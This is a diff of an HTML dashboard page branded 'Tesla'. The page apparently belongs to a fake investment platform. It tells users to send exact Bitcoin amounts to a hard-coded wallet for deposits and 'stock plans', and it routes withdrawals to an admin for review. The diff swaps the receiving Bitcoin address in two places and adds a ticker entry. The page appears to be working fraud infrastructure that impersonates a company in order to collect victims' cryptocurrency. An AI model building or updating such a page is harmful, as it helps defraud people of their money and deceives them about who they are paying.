@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tesla • Dashboard</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body class="dashboard-body">
@@ -47,6 +47,7 @@
                 <span class="price-tag">XPEV <span class="tick-price" id="tickXpev">$8.10</span> <span class="tick-pct green" id="tickXpevPct">+1.10%</span></span>
                 <span class="price-tag">LI <span class="tick-price" id="tickLi">$25.40</span> <span class="tick-pct red" id="tickLiPct">-0.20%</span></span>
                 <span class="price-tag">F <span class="tick-price" id="tickF">$12.30</span> <span class="tick-pct green" id="tickFPct">+0.40%</span></span>
+                <span class="price-tag">SPCX <span class="tick-price" id="tickSpcx">$140.30</span> <span class="tick-pct green" id="tickSpcxPct">+0.60%</span></span>
             </span>
         </div>
     </div>
@@ -123,7 +124,7 @@
                 </div>
                 <p class="small-note" style="margin-top:20px;">Send the exact amount to this Bitcoin (BTC) address:</p>
                 <div class="wallet-box">
-                    <code id="btcAddress">1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ</code>
+                    <code id="btcAddress">35q7HRHk73ZrvbYrrez8RpM7CcSUb8HPux</code>
                     <button class="copy-btn" onclick="copyAddress()"><i class="fas fa-copy"></i></button>
                 </div>
                 <div class="deposit-warning">
@@ -148,10 +149,8 @@
             </div>
         </div>
 
-        <!-- ============ WITHDRAW TAB ============ -->
         <div id="tab-withdraw" class="tab-content">
             <h2 class="section-title">WITHDRAW FUNDS</h2>
-
             <div class="deposit-info-panel">
                 <div class="info-row"><span><i class="fas fa-wallet"></i> Available Balance</span><span class="info-val" id="withdrawAvailableBalance">$0.00</span></div>
                 <div class="info-row"><span><i class="fas fa-clock"></i> Processing Time</span><span class="info-val">~24 hours</span></div>
@@ -159,91 +158,60 @@
                 <div class="info-row"><span><i class="fas fa-bolt"></i> Minimum Withdrawal</span><span class="info-val">$50.00</span></div>
             </div>
 
-            <!-- STEP 1 -->
             <div class="action-card" id="wStep1">
                 <p class="deposit-label">STEP 1 — AMOUNT & METHOD</p>
                 <p class="small-note">Enter the amount you want to withdraw and choose your payment method.</p>
-
                 <div class="custom-amount-box" style="margin-top:15px;">
                     <span class="currency-prefix">$</span>
                     <input type="number" id="withdrawAmount" placeholder="0.00" min="50">
                 </div>
-
                 <div class="amount-grid" style="margin-top:12px;">
                     <button class="amount-btn" data-wpercent="25">25%</button>
                     <button class="amount-btn" data-wpercent="50">50%</button>
                     <button class="amount-btn" data-wpercent="75">75%</button>
                     <button class="amount-btn" data-wpercent="100">MAX</button>
                 </div>
-
                 <p class="deposit-label" style="margin-top:20px;">WITHDRAWAL METHOD</p>
                 <div class="amount-grid">
-                    <button class="amount-btn" id="wMethodCrypto" style="grid-column: span 3;">
-                        <i class="fab fa-bitcoin"></i> Bitcoin (BTC)
-                    </button>
-                    <button class="amount-btn" id="wMethodBank" style="grid-column: span 3;">
-                        <i class="fas fa-university"></i> Bank Transfer
-                    </button>
+                    <button class="amount-btn" id="wMethodCrypto" style="grid-column: span 3;"><i class="fab fa-bitcoin"></i> Bitcoin (BTC)</button>
+                    <button class="amount-btn" id="wMethodBank" style="grid-column: span 3;"><i class="fas fa-university"></i> Bank Transfer</button>
                 </div>
-
                 <button class="btn-primary btn-block" id="wBtnContinue" style="margin-top:20px;">CONTINUE →</button>
             </div>
 
-            <!-- STEP 2 -->
             <div class="action-card" id="wStep2" style="display:none;">
                 <p class="deposit-label">STEP 2 — PAYMENT DETAILS</p>
                 <p class="small-note" id="wStep2Label">Enter your Bitcoin wallet address.</p>
-
                 <div id="wCryptoFields">
-                    <div class="input-group" style="margin-top:15px;">
-                        <input type="text" id="wCryptoAddress" placeholder="Bitcoin Wallet Address">
-                    </div>
+                    <div class="input-group" style="margin-top:15px;"><input type="text" id="wCryptoAddress" placeholder="Bitcoin Wallet Address"></div>
                 </div>
-
                 <div id="wBankFields" style="display:none;">
-                    <div class="input-group" style="margin-top:15px;">
-                        <input type="text" id="wBankName" placeholder="Bank Name">
-                    </div>
-                    <div class="input-group">
-                        <input type="text" id="wAccountName" placeholder="Account Holder Name">
-                    </div>
-                    <div class="input-group">
-                        <input type="text" id="wAccountNumber" placeholder="Account Number">
-                    </div>
+                    <div class="input-group" style="margin-top:15px;"><input type="text" id="wBankName" placeholder="Bank Name"></div>
+                    <div class="input-group"><input type="text" id="wAccountName" placeholder="Account Holder Name"></div>
+                    <div class="input-group"><input type="text" id="wAccountNumber" placeholder="Account Number"></div>
                 </div>
-
                 <button class="btn-primary btn-block" id="wBtnReview" style="margin-top:15px;">REVIEW WITHDRAWAL →</button>
                 <button class="btn-outline" style="margin-top:10px;" id="wBtnBack1">← BACK</button>
             </div>
 
-            <!-- STEP 3 -->
             <div class="action-card" id="wStep3" style="display:none;">
                 <p class="deposit-label">STEP 3 — CONFIRM WITHDRAWAL</p>
                 <p class="small-note">Please review your withdrawal request before submitting.</p>
-
                 <div class="deposit-summary">
                     <div class="summary-row"><span>Amount</span><span id="wReviewAmount">$0.00</span></div>
                     <div class="summary-row"><span>Method</span><span id="wReviewMethod">-</span></div>
                     <div class="summary-row"><span>Fee</span><span class="free-fee">FREE</span></div>
                     <div class="summary-row"><span>You Receive</span><span id="wReviewReceive">$0.00</span></div>
                 </div>
-
                 <div id="wReviewDetails" style="margin-top:15px;"></div>
-
-                <button class="btn-primary btn-block" id="wBtnConfirm" style="margin-top:15px; background:#8B0000; color:#fff;">
-                    CONFIRM WITHDRAWAL
-                </button>
+                <button class="btn-primary btn-block" id="wBtnConfirm" style="margin-top:15px; background:#8B0000; color:#fff;">CONFIRM WITHDRAWAL</button>
                 <button class="btn-outline" style="margin-top:10px;" id="wBtnBack2">← BACK</button>
             </div>
 
-            <!-- STEP 4 -->
             <div class="action-card success-card" id="wStep4" style="display:none;">
                 <div class="success-icon"><i class="fas fa-check"></i></div>
                 <h3 class="success-title">Withdrawal Submitted</h3>
-                <p class="small-note" style="text-align:center;">
-                    Your withdrawal request has been sent to the admin for review.
-                    You will receive your funds within ~24 hours after approval.
-                </p>
+                <p class="small-note" style="text-align:center;">Your withdrawal request has been sent to the admin for review.</p>
                 <div class="success-details">
                     <div class="detail-row"><span>Amount:</span> <span id="wSuccessAmount">$0.00</span></div>
                     <div class="detail-row"><span>Method:</span> <span id="wSuccessMethod">-</span></div>
@@ -301,12 +269,12 @@
     </main>
 
     <nav class="bottom-nav">
-        <button class="nav-item active" data-target="home"><i class="fas fa-home"></i><span>HOME</span></button>
-        <button class="nav-item" data-target="shop"><i class="fas fa-car"></i><span>SHOP</span></button>
-        <button class="nav-item" data-target="deposit"><i class="fas fa-arrow-down"></i><span>DEPOSIT</span></button>
-        <button class="nav-item" data-target="withdraw"><i class="fas fa-arrow-up"></i><span>WITHDRAW</span></button>
-        <button class="nav-item" data-target="plans"><i class="fas fa-chart-line"></i><span>STOCKS</span></button>
-        <button class="nav-item" data-target="profile"><i class="fas fa-user"></i><span>PROFILE</span></button>
+        <button class="nav-item active" data-target="home"><i class="fas fa-home"></i><span>Home</span></button>
+        <button class="nav-item" data-target="shop"><i class="fas fa-car"></i><span>Shop</span></button>
+        <button class="nav-item" data-target="deposit"><i class="fas fa-arrow-down"></i><span>Deposit</span></button>
+        <button class="nav-item" data-target="withdraw"><i class="fas fa-arrow-up"></i><span>Withdraw</span></button>
+        <button class="nav-item" data-target="plans"><i class="fas fa-chart-line"></i><span>Stocks</span></button>
+        <button class="nav-item" data-target="profile"><i class="fas fa-user"></i><span>Profile</span></button>
     </nav>
 
     <div class="modal-overlay" id="purchaseModal">
@@ -338,7 +306,7 @@
             <div class="plan-pay-amount" id="planPayAmount">$0.00</div>
             <p class="small-note" style="margin-top:20px;">Send the exact amount in Bitcoin (BTC) to this address:</p>
             <div class="wallet-box">
-                <code id="planBtcAddress">1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ</code>
+                <code id="planBtcAddress">35q7HRHk73ZrvbYrrez8RpM7CcSUb8HPux</code>
                 <button class="copy-btn" onclick="copyPlanAddress()"><i class="fas fa-copy"></i></button>
             </div>
             <div class="deposit-warning">
@@ -363,7 +331,6 @@
     <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore-compat.js"></script>
-
     <script src="script.js"></script>
     <script>document.addEventListener('DOMContentLoaded', () => { if (typeof initDashboard === 'function') initDashboard(); });</script>
     
